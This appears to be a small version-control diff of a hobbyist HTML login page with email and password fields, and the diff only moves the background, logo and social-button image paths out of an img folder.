@@ -85,10 +85,10 @@ input[type=checkbox] {
 }
 </style>
 </head>
-<body background="img\cool-background.jpg" >
+<body background="cool-background.jpg" >
 <!logo>
 <div style="position:absolute; top:0;">
-<img src="img\logo.png" width="200" height="200">
+<img src="logo.png" width="200" height="200">
 </div>
 <!end logo>
 
@@ -108,7 +108,7 @@ input[type=checkbox] {
                   <td style="border-left:none;color:red;font-size:30px;">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
 &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp                                                                                            <br>
         <div style="position:absolute;left:650;top:150;">
-              <img src="img\fb.jpg" width=350 height=70>
+              <img src="fb.jpg" width=350 height=70>
            </div>
 <tr><td style="border-left:none;border-right:none;color:red;font-size:30px;">EMAIL 
 <input name=em type=text >  
@@ -118,7 +118,7 @@ input[type=checkbox] {
                                                                                                                        &nbsp&nbsp
 </td>
                      <div style="position:absolute;left:650;top:300;">
-                         <img src="img\go.png" width=350 height=70>
+                         <img src="go.png" width=350 height=70>
                        </div>
 <tr><td  style="border-left:none;border-right:none;color:red;font-size:30px;">PASSWORD<br>
 <input name=ps type=password >
